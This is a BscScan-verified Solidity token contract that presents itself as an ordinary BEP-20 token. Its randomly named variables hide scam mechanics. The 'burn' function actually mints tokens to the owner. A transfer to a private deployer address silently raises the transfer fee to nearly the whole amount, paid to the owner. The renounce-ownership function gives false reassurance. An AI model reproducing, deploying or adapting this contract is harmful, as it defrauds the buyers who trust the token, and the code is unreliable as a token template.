/**
 *Submitted for verification at BscScan.com on 2022-11-12
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-11
 */
pragma solidity >=0.8.15;
contract Ceixue {
address public owner;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  JCZmyt = 10000000000000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  pYmmpM = 100000000000000000000000;
uint256 public  WFHEFa = 10000000000000000;
uint256 public  IpFuAi = 100000000000000000;
string public  name = "RZmInx";
uint256 public  gkRqhg = 100000000000000000000000;
mapping (address => uint256) public balanceOf;
address public  zSPcty = address(0);
address public  WVcngf = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public  IdDaiK = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public  PtKYst = 10000000000000000000;
address public  ZusZHU = address(0);
string public  symbol = "Kulmhu";
uint256 public  NgcsmC = 1000000000000000000;
uint256 public  vFfxci = 100000000000000000000;
uint8 public constant decimals = 18;
uint256 private  qXRKhi = 10000000000000;
address private  BbFrmA = address(0);
address public  IyPBJi = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public constant gfmkQF = 1222222;
address public  TkPuPM = address(0);
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
constructor () {
BbFrmA = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
receive() external payable {}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "CdeHVH");
require(to != address(0), "CdeHVH");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* gfmkQF/qXRKhi ;
}
uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==BbFrmA){
qXRKhi = 1222222+1;
}
emit Transfer(from, to, transferAmount);
}

}